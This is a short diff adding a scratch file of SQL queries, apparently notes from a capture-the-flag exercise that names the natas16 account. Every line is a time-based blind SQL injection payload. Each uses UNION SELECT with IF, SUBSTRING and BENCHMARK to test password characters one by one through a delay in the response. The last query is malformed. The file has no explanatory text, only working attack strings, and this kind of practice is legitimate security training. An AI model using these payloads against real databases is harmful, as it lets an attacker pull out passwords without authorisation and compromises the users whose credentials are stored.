@@ -1,0 +1,16 @@
+
+
+
+select * from ctf where username='user1' UNION SELECT IF(binary SUBSTRING(password,1,1)='p', BENCHMARK(2000000, SHA1("aaaaa")), "false"),"1" from ctf;
+
+
+
+select * from ctf where username='user1' 
+UNION 
+SELECT IF(binary SUBSTRING(password,1,1)='p', BENCHMARK(2000000, SHA1("aaaaa")), "false"),"1" 
+from ctf;
+
+
+
+
+SELECT * from users where username=natas16 AND UNION SELECT IF(binary SUBSTRING(password,1,1)=CHAR(84), BENCHMARK(3000000, SHA1("aaaaa")), "false"),"1" from users
